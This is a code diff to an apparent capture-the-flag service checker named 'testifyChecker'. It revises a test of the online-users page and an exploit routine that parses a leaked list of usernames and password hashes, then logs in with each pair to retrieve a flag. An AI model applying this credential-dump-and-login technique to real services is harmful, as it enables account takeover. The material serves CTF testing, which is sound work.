@@ -29,7 +29,7 @@ def get_profile():
 
 
 def get_random_string():
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=30))
 
 
 def tuple_string_to_list(test_str):
@@ -214,8 +214,7 @@ class testifyChecker(BaseChecker):
             # test show online users
             profile1 = get_profile()
             self.register(profile1['username'], profile1['password'])
-            time.sleep(0.5)
-            resp = self.http_get('/')
+            resp = self.http_get('/about')
             self.debug(resp.text)
             assert_in("&#39;" + profile1['username'] + "&#39;", resp.text, f'username {profile1["username"]} not '
                                                                            f'found in online users')
@@ -253,6 +252,7 @@ class testifyChecker(BaseChecker):
             password = profile['password']
 
             self.register(username, password)
+            self.http_get('/about')
 
             app_id = self.make_appointment(profile['prename'], profile['lastname'], filename, profile['date'],
                                            profile['time'], profile['file'])
@@ -263,12 +263,12 @@ class testifyChecker(BaseChecker):
             }
 
             res = self.http_get(route, **kwargs)
-            sql_string = res.content[27:-2].decode('ascii')
-            user_list = tuple_string_to_list(sql_string)
-            search_string = ""
-            for i in user_list:
-                user = (i[1])[1:-1]
-                hash = (i[2])[2:]
+            sql_string = res.content.decode('ascii').splitlines()
+            user_list = [i.split(',')[1:3] for i in sql_string]
+            for i in range(len(user_list)-1, -1, -1):
+                elem = user_list[i]
+                user = elem[0][1:-1]
+                hash = elem[1][2:]
                 kwargs2 = {
                     'data': {
                         'username': user,
@@ -277,13 +277,10 @@ class testifyChecker(BaseChecker):
                     },
                     'allow_redirects': True
                 }
-                res2 = self.http_post('/login', **kwargs2)
-                search_string += res2.text
-            flag = self.search_flag(search_string)
-            if not flag:
-                raise BrokenServiceException("Resulting flag was found to be incorrect")
-            else:
-                return flag
+                res = self.http_post('/login', **kwargs2)
+                if flag := self.search_flag(res.text):
+                    return flag
+            raise BrokenServiceException("Resulting flag was found to be incorrect")
 
 
 app = testifyChecker.service  # This can be used for uswgi.
